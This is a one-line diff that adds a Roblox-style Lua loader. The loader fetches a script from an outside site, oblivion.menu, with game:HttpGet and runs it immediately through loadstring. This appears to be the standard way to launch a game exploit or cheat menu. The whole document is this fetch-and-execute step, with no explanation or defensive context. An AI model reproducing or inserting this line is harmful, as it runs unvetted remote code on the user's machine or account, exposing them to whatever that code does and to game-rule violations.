@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://oblivion.menu/script"))()
